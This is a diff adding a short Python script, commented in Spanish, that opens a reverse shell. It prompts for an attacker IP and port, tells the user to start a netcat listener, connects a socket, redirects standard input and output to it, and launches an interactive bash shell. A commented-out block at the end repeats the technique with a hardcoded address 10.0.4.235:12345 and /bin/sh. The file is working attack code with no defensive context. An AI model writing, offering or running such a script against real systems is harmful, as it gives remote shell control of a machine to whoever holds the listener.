@@ -1,0 +1,60 @@
+#!/usr/bin/python3
+
+from os import dup2
+from subprocess import run
+import socket
+
+# Función para imprimir con color
+def print_color(message, color_code):
+    print("\033[" + str(color_code) + "m" + message + "\033[0m")
+
+# Función para establecer la conexión de shell inversa
+def establecer_conexion(ip, puerto):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((ip, puerto))
+        dup2(s.fileno(), 0)
+        dup2(s.fileno(), 1)
+        dup2(s.fileno(), 2)
+        run(["/bin/bash", "-i"])
+    except Exception as e:
+        print_color(f"Error al conectar: {e}", 91)
+
+# Agregar espacios para mayor claridad
+print_color("", 94)
+print_color("_________________________________________________________", 94)
+print_color("", 94)
+
+# Mensaje
+print_color("Ejecutar nc nvlp 1234 en la otra máquina", 95)
+
+# Preguntar por la IP
+ip = input("\033[93mIngresa la dirección IP: \033[0m")
+
+# Preguntar por el puerto
+default_port = 1234
+puerto_input = input("\033[93mIngresa el puerto o presiona Enter para usar el puerto por defecto (1234): \033[0m")
+puerto = int(puerto_input) if puerto_input else default_port
+
+# Confirmar antes de ejecutar
+ejecutar = input(f"\033[92m¿Ejecutar conexión a {ip} en el puerto {puerto}? [S/n']: \033[0m").strip().lower()
+if ejecutar in ['', 's']:
+    establecer_conexion(ip, puerto)
+else:
+    print_color("Operación cancelada.", 91)
+
+
+
+
+#import socket
+#import subprocess
+#import os
+
+#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#s.connect(("10.0.4.235",12345))
+#os.dup2(s.fileno(),0)
+#os.dup2(s.fileno(),1)
+#os.dup2(s.fileno(),2)
+
+#subprocess.call(["/bin/sh","-i"])
+
